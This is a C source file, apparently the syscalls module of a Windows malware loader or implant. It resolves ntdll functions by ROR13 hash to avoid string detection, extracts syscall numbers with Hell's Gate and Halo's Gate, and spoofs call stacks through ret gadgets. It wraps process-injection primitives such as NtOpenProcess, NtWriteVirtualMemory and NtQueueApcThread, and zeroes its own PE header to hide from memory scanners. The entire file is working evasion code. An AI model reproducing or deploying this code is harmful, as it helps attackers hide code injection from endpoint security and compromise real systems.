/*
 * Author: 28Zaakypro@proton.me
 * Syscalls Module - Indirect syscalls using fresh ntdll.dll copy
 * Extracts SSNs from clean ntdll, calls through "syscall; ret" gadget
 * Uses API hashing (ROR13) to avoid string detection
 */

#include "syscalls.h"
#include "evs.h"
#include "evs_strings.h"
#include <stdio.h>
#include <string.h>

// ROR13 hash function for API resolution
static DWORD ror13_hash(const char *name)
{
    DWORD hash = 0;
    while (*name)
    {
        hash = (hash >> 13) | (hash << (32 - 13));       // Rotate right 13 bits
        hash += (*name >= 'a') ? (*name - 0x20) : *name; // Convert to uppercase
        name++;
    }
    return hash;
}

// Syscall info structure
typedef struct _SYSCALL_INFO
{
    DWORD ssn;
    PVOID syscallAddress;
} SYSCALL_INFO, *PSYSCALL_INFO;

#define SYSCALL_COUNT 14

// Precomputed ROR13 hashes for syscall functions
#define HASH_NtAllocateVirtualMemory    0x5947FD91
#define HASH_NtProtectVirtualMemory     0x1255C05B
#define HASH_NtFreeVirtualMemory        0x69A0287F
#define HASH_NtWriteVirtualMemory       0x4B2D0096
#define HASH_NtReadVirtualMemory        0xC92C187D
#define HASH_NtQueueApcThread           0x1126191E
#define HASH_NtResumeThread             0x63C738A0
#define HASH_NtClose                    0x9BD4442F
#define HASH_NtOpenProcess              0x8F879070
#define HASH_NtCreateFile               0xE2068364
#define HASH_NtReadFile                 0x637ACCE6
#define HASH_NtWriteFile                0x668B0D03
#define HASH_NtDelayExecution           0x932D8A1A
#define HASH_NtWaitForSingleObject      0x3C637286

enum
{
    IDX_NtAllocateVirtualMemory = 0,
    IDX_NtProtectVirtualMemory,
    IDX_NtFreeVirtualMemory,
    IDX_NtWriteVirtualMemory,
    IDX_NtReadVirtualMemory,
    IDX_NtQueueApcThread,
    IDX_NtResumeThread,
    IDX_NtClose,
    IDX_NtOpenProcess,
    IDX_NtCreateFile,
    IDX_NtReadFile,
    IDX_NtWriteFile,
    IDX_NtDelayExecution,
    IDX_NtWaitForSingleObject
};

static SYSCALL_INFO g_SyscallTable[SYSCALL_COUNT] = {0};
static PVOID g_FreshNtdll = NULL;
static BOOL g_Initialized = FALSE;

// Spoof frames for dosyscall.S — populated in InitializeSyscallsModule()
PVOID g_spoof_frame1 = NULL;   // ntdll     ret gadget (frame 1)
PVOID g_spoof_frame2 = NULL;   // KernelBase ret gadget (frame 2, or 4th in sleep chain)
PVOID g_spoof_frame3 = NULL;   // ntdll     ret gadget (frame 2 of 4, DoSleepSpoof only)
PVOID g_spoof_frame4 = NULL;   // ntdll     ret gadget (frame 3 of 4, DoSleepSpoof only)

// Internal prototypes
static BOOL LoadFreshNtdll(void);
static PVOID FindSyscallAddress(PVOID moduleBase);
static PVOID FindRetGadget(PVOID moduleBase, SIZE_T min_off);
static PVOID FindRetGadgetAfter(PVOID moduleBase, PVOID afterAddr);
static PVOID GetFunctionByHash(PVOID moduleBase, DWORD hash);
static DWORD ExtractSSN(PVOID functionAddress);
static DWORD HalosGateSSN(PVOID moduleBase, PVOID hookedFnAddr);

// Assembly syscall stubs (dosyscall.S)
extern NTSTATUS DoSyscall(
    DWORD ssn, PVOID syscallAddr,
    PVOID arg1, PVOID arg2, PVOID arg3,
    PVOID arg4, PVOID arg5, PVOID arg6);

extern NTSTATUS DoSyscall11(
    DWORD ssn, PVOID syscallAddr,
    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4,
    PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8,
    PVOID arg9, PVOID arg10, PVOID arg11);

// 4-frame sleep spoof: ntdll1 → ntdll2 → ntdll3 → KernelBase → real caller
// Uses g_spoof_frame1/3/4 (ntdll gadgets) + g_spoof_frame2 (KernelBase)
extern NTSTATUS DoSleepSpoof(
    DWORD ssn, PVOID syscallAddr,
    PVOID alertable, PVOID pInterval);

// Loads ntdll.dll from disk (clean copy)
static BOOL LoadFreshNtdll(void)
{
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    char ntdllSep[sizeof(EVS_path_ntdll_sep) + 1];
    EVS_D(ntdllSep, EVS_path_ntdll_sep);
    lstrcatA(ntdllPath, ntdllSep);
    SecureZeroMemory(ntdllSep, sizeof(ntdllSep));

    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    /* SEC_IMAGE maps the PE as a proper image (VAs match section headers).
     * ReadFile would use raw file offsets; with SEC_IMAGE, RVA lookups in
     * GetFunctionByHash / HalosGateSSN are correct without any fixup. */
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return FALSE;

    g_FreshNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    return (g_FreshNtdll != NULL);
}

static PVOID FindSyscallAddress(PVOID moduleBase)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    PVOID textBase = NULL;
    DWORD textSize = 0;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(section[i].Name, ".text", 5) == 0)
        {
            textBase = (BYTE *)moduleBase + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textBase)
        return NULL;

    BYTE *current = (BYTE *)textBase;
    BYTE *end = current + textSize - 2;

    while (current < end)
    {
        if (current[0] == 0x0F && current[1] == 0x05 && current[2] == 0xC3)
            return current;
        current++;
    }

    return NULL;
}

// Scan a mapped module's .text for a single 0xC3 (ret) byte, starting at min_off
// from the module base. Used to find spoof-frame ret gadgets.
static PVOID FindRetGadget(PVOID moduleBase, SIZE_T min_off)
{
    if (!moduleBase) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS64 nth = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);

    PVOID textBase = NULL;
    DWORD textSize = 0;

    for (int i = 0; i < nth->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(sec[i].Name, ".text", 5) == 0)
        {
            textBase = (BYTE *)moduleBase + sec[i].VirtualAddress;
            textSize = sec[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textBase || textSize < min_off) return NULL;

    BYTE *p   = (BYTE *)textBase + min_off;
    BYTE *end = (BYTE *)textBase + textSize;

    while (p < end)
    {
        if (*p == 0xC3)
            return p;
        p++;
    }

    return NULL;
}

// Scan a module's .text for 0xC3 starting strictly after afterAddr (exclusive).
static PVOID FindRetGadgetAfter(PVOID moduleBase, PVOID afterAddr)
{
    if (!moduleBase || !afterAddr) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS64 nth = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);

    PVOID textBase = NULL;
    DWORD textSize = 0;
    for (int i = 0; i < nth->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(sec[i].Name, ".text", 5) == 0)
        {
            textBase = (BYTE *)moduleBase + sec[i].VirtualAddress;
            textSize = sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!textBase) return NULL;

    BYTE *start = (BYTE *)afterAddr + 1;
    BYTE *end   = (BYTE *)textBase + textSize;
    if (start < (BYTE *)textBase || start >= end) return NULL;

    for (BYTE *p = start; p < end; p++)
    {
        if (*p == 0xC3) return p;
    }
    return NULL;
}

// Halo's Gate: when a stub in g_FreshNtdll is patched (JMP trampoline),
// walk neighboring EAT entries to find a clean stub and compute our SSN by delta.
static DWORD HalosGateSSN(PVOID moduleBase, PVOID hookedFnAddr)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 nth = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dos->e_lfanew);

    DWORD eatRva = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!eatRva) return 0;

    PIMAGE_EXPORT_DIRECTORY eat = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + eatRva);
    DWORD *addrFns = (DWORD *)((BYTE *)moduleBase + eat->AddressOfFunctions);

    DWORD targetRva = (DWORD)((BYTE *)hookedFnAddr - (BYTE *)moduleBase);

    int targetIdx = -1;
    for (DWORD i = 0; i < eat->NumberOfFunctions; i++)
    {
        if (addrFns[i] == targetRva)
        {
            targetIdx = (int)i;
            break;
        }
    }
    if (targetIdx < 0) return 0;

    for (int delta = 1; delta <= 32; delta++)
    {
        for (int sign = -1; sign <= 1; sign += 2)
        {
            int idx = targetIdx + sign * delta;
            if (idx < 0 || idx >= (int)eat->NumberOfFunctions) continue;
            if (addrFns[idx] == 0) continue;

            BYTE *b = (BYTE *)moduleBase + addrFns[idx];
            if (b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8)
            {
                DWORD neighborSSN = *(DWORD *)(b + 4);
                return (DWORD)((int)neighborSSN - sign * delta);
            }
        }
    }
    return 0;
}

// Finds function in Export Directory by ROR13 hash
static PVOID GetFunctionByHash(PVOID moduleBase, DWORD targetHash)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);

    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + exportDirRva);

    DWORD *addressOfFunctions = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((BYTE *)moduleBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
    {
        char *currentName = (char *)((BYTE *)moduleBase + addressOfNames[i]);
        DWORD hash = ror13_hash(currentName);

        if (hash == targetHash)
        {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD functionRva = addressOfFunctions[ordinal];
            return (BYTE *)moduleBase + functionRva;
        }
    }

    return NULL;
}

// Extracts SSN from syscall function stub.
// Hell's Gate: reads SSN directly from clean 4C 8B D1 B8 stub.
// Halo's Gate: if stub is patched (0xE9 JMP trampoline), walks EAT neighbors.
static DWORD ExtractSSN(PVOID functionAddress)
{
    BYTE *bytes = (BYTE *)functionAddress;

    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8)
        return *(DWORD *)(bytes + 4);

    return HalosGateSSN(g_FreshNtdll, functionAddress);
}

// Public API
BOOL InitializeSyscallsModule(void)
{
    if (g_Initialized)
    {
        return TRUE;
    }

#ifndef PRODUCTION
    printf("[*] Initializing indirect syscalls...\n");
#endif

    if (!LoadFreshNtdll())
    {
#ifndef PRODUCTION
        printf("[-] Failed to load ntdll.dll\n");
#endif
        return FALSE;
    }

    char ntdllName[sizeof(EVS_dll_ntdll) + 1];
    EVS_D(ntdllName, EVS_dll_ntdll);
    HMODULE hNtdll = GetModuleHandleA(ntdllName);
    SecureZeroMemory(ntdllName, sizeof(ntdllName));

    PVOID syscallAddress = FindSyscallAddress(hNtdll);

    // Spoof-frame ret gadgets for dosyscall.S call stack spoofing
    char kbName[sizeof(EVS_dll_kernelbase) + 1];
    EVS_D(kbName, EVS_dll_kernelbase);
    HMODULE hKb = GetModuleHandleA(kbName);
    SecureZeroMemory(kbName, sizeof(kbName));

    g_spoof_frame1 = FindRetGadget(hNtdll, 0x3000);
    g_spoof_frame3 = g_spoof_frame1 ? FindRetGadgetAfter(hNtdll, g_spoof_frame1) : NULL;
    g_spoof_frame4 = g_spoof_frame3 ? FindRetGadgetAfter(hNtdll, g_spoof_frame3) : NULL;
    g_spoof_frame2 = FindRetGadget(hKb, 0x2000);

    if (!syscallAddress)
    {
#ifndef PRODUCTION
        printf("[-] Failed to find syscall instruction\n");
#endif
        return FALSE;
    }

    // Precomputed hashes (no cleartext function names)
    DWORD functionHashes[SYSCALL_COUNT] = {
        HASH_NtAllocateVirtualMemory,
        HASH_NtProtectVirtualMemory,
        HASH_NtFreeVirtualMemory,
        HASH_NtWriteVirtualMemory,
        HASH_NtReadVirtualMemory,
        HASH_NtQueueApcThread,
        HASH_NtResumeThread,
        HASH_NtClose,
        HASH_NtOpenProcess,
        HASH_NtCreateFile,
        HASH_NtReadFile,
        HASH_NtWriteFile,
        HASH_NtDelayExecution,
        HASH_NtWaitForSingleObject};

    // Resolve all functions by hash
    for (int i = 0; i < SYSCALL_COUNT; i++)
    {
        PVOID funcAddr = GetFunctionByHash(g_FreshNtdll, functionHashes[i]);
        if (!funcAddr)
        {
#ifndef PRODUCTION
            printf("[-] Function with hash 0x%08X not found\n", functionHashes[i]);
#endif
            return FALSE;
        }

        DWORD ssn = ExtractSSN(funcAddr);
        if (ssn == 0)
        {
#ifndef PRODUCTION
            printf("[-] SSN extraction failed for hash 0x%08X\n", functionHashes[i]);
#endif
            return FALSE;
        }

        g_SyscallTable[i].ssn = ssn;
        g_SyscallTable[i].syscallAddress = syscallAddress;
    }

    /* Fix #7: stomp PE header of the fresh ntdll mapping before releasing it.
     * SEC_IMAGE pages are copy-on-write; PAGE_WRITECOPY lets us zero them.
     * After this point SSNs are cached in g_SyscallTable — the view is done. */
    if (g_FreshNtdll)
    {
        DWORD dummy;
        if (SysVirtualProtect(g_FreshNtdll, 0x1000, PAGE_WRITECOPY, &dummy))
            SecureZeroMemory(g_FreshNtdll, 0x1000);
        UnmapViewOfFile(g_FreshNtdll);
        g_FreshNtdll = NULL;
    }

    g_Initialized = TRUE;
#ifndef PRODUCTION
    printf("[+] Syscalls module initialized (%d syscalls)\n\n", SYSCALL_COUNT);
#endif

    return TRUE;
}

VOID CleanupSyscallsModule(void)
{
    if (g_FreshNtdll)
    {
        UnmapViewOfFile(g_FreshNtdll);
        g_FreshNtdll = NULL;
    }
    g_Initialized = FALSE;
}

// WRAPPERS NTAPI
NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtAllocateVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)BaseAddress, (PVOID)ZeroBits,
        (PVOID)RegionSize, (PVOID)(ULONG_PTR)AllocationType, (PVOID)(ULONG_PTR)Protect);
}

NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtProtectVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)BaseAddress, (PVOID)NumberOfBytesToProtect,
        (PVOID)(ULONG_PTR)NewAccessProtection, (PVOID)OldAccessProtection, NULL);
}

NTSTATUS SysNtFreeVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtFreeVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)BaseAddress, (PVOID)RegionSize,
        (PVOID)(ULONG_PTR)FreeType, NULL, NULL);
}

NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWriteVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, BaseAddress, Buffer,
        (PVOID)NumberOfBytesToWrite, (PVOID)NumberOfBytesWritten, NULL);
}

NTSTATUS SysNtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtReadVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, BaseAddress, Buffer,
        (PVOID)NumberOfBytesToRead, (PVOID)NumberOfBytesRead, NULL);
}

NTSTATUS SysNtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtQueueApcThread];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ThreadHandle, ApcRoutine, ApcArgument1,
        ApcArgument2, ApcArgument3, NULL);
}

NTSTATUS SysNtResumeThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtResumeThread];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ThreadHandle, (PVOID)PreviousSuspendCount, NULL,
        NULL, NULL, NULL);
}

NTSTATUS SysNtClose(HANDLE Handle)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtClose];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)Handle, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtOpenProcess];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)(ULONG_PTR)DesiredAccess, (PVOID)ObjectAttributes,
        (PVOID)ClientId, NULL, NULL);
}

NTSTATUS SysNtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtCreateFile];
    return DoSyscall11(
        info->ssn, info->syscallAddress,
        (PVOID)FileHandle, (PVOID)(ULONG_PTR)DesiredAccess, (PVOID)ObjectAttributes,
        (PVOID)IoStatusBlock, (PVOID)AllocationSize, (PVOID)(ULONG_PTR)FileAttributes,
        (PVOID)(ULONG_PTR)ShareAccess, (PVOID)(ULONG_PTR)CreateDisposition,
        (PVOID)(ULONG_PTR)CreateOptions, EaBuffer, (PVOID)(ULONG_PTR)EaLength);
}

NTSTATUS SysNtReadFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtReadFile];
    return DoSyscall11(
        info->ssn, info->syscallAddress,
        (PVOID)FileHandle, (PVOID)Event, ApcRoutine, ApcContext,
        (PVOID)IoStatusBlock, Buffer, (PVOID)(ULONG_PTR)Length,
        (PVOID)ByteOffset, (PVOID)Key, NULL, NULL);
}

NTSTATUS SysNtWriteFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWriteFile];
    return DoSyscall11(
        info->ssn, info->syscallAddress,
        (PVOID)FileHandle, (PVOID)Event, ApcRoutine, ApcContext,
        (PVOID)IoStatusBlock, Buffer, (PVOID)(ULONG_PTR)Length,
        (PVOID)ByteOffset, (PVOID)Key, NULL, NULL);
}

// HELPERS WINAPI-LIKE
PVOID SysVirtualAlloc(
    PVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect)
{
    PVOID baseAddress = lpAddress;
    SIZE_T regionSize = dwSize;

    NTSTATUS status = SysNtAllocateVirtualMemory(
        (HANDLE)-1, // Current process
        &baseAddress,
        0,
        &regionSize,
        flAllocationType,
        flProtect);

    return NT_SUCCESS(status) ? baseAddress : NULL;
}

BOOL SysVirtualProtect(
    PVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect)
{
    PVOID baseAddress = lpAddress;
    SIZE_T regionSize = dwSize;
    ULONG oldProtect = 0;

    NTSTATUS status = SysNtProtectVirtualMemory(
        (HANDLE)-1,
        &baseAddress,
        &regionSize,
        flNewProtect,
        &oldProtect);

    if (lpflOldProtect)
    {
        *lpflOldProtect = oldProtect;
    }

    return NT_SUCCESS(status);
}

BOOL SysVirtualFree(
    PVOID lpAddress,
    SIZE_T dwSize,
    DWORD dwFreeType)
{
    PVOID baseAddress = lpAddress;
    SIZE_T regionSize = dwSize;

    NTSTATUS status = SysNtFreeVirtualMemory(
        (HANDLE)-1,
        &baseAddress,
        &regionSize,
        dwFreeType);

    return NT_SUCCESS(status);
}

BOOL SysCloseHandle(HANDLE hObject)
{
    NTSTATUS status = SysNtClose(hObject);
    return NT_SUCCESS(status);
}

HANDLE SysOpenProcess(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId)
{
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
    clientId.UniqueThread = NULL;

    NTSTATUS status = SysNtOpenProcess(
        &hProcess,
        dwDesiredAccess,
        &objAttr,
        &clientId);

    return NT_SUCCESS(status) ? hProcess : NULL;
}

// 4-frame spoofed sleep: ntdll1→ntdll2→ntdll3→KernelBase→real caller
NTSTATUS SysNtDelayExecution(BOOLEAN alertable, PLARGE_INTEGER interval)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtDelayExecution];
    return DoSleepSpoof(
        info->ssn, info->syscallAddress,
        (PVOID)(ULONG_PTR)alertable, (PVOID)interval);
}

NTSTATUS SysNtWaitForSingleObject(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWaitForSingleObject];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)Handle, (PVOID)(ULONG_PTR)Alertable, (PVOID)Timeout,
        NULL, NULL, NULL);
}

// Fix #7: zero the self PE header in memory (MZ+NT headers + section table).
// Forces memory scanners to see no valid PE at the load address.
BOOL StompSelfPEHeader(void)
{
    PVOID base = (PVOID)GetModuleHandleA(NULL);
    if (!base) return FALSE;
    DWORD old, dummy;
    if (!SysVirtualProtect(base, 0x1000, PAGE_READWRITE, &old)) return FALSE;
    SecureZeroMemory(base, 0x1000);
    SysVirtualProtect(base, 0x1000, old, &dummy);
    return TRUE;
}
